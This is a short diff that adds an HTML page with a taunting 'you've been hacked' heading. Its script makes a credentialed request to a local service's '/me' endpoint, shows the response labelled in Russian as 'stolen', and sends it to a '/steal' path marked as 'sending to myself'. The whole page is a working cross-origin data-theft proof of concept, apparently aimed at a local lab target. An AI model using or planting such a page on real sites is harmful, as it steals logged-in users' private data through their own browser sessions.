@@ -1,0 +1,9 @@
+<h1>Hello ma boy, you've been hacked</h1>
+<script>
+    fetch("http://localhost:8000/me", { credentials: "include" })
+  .then(r => r.text())
+  .then(data => {
+    document.body.innerText = "Украдено: " + data;
+    fetch("/steal?d=" + encodeURIComponent(data)); // «отправка себе»
+  });
+</script>
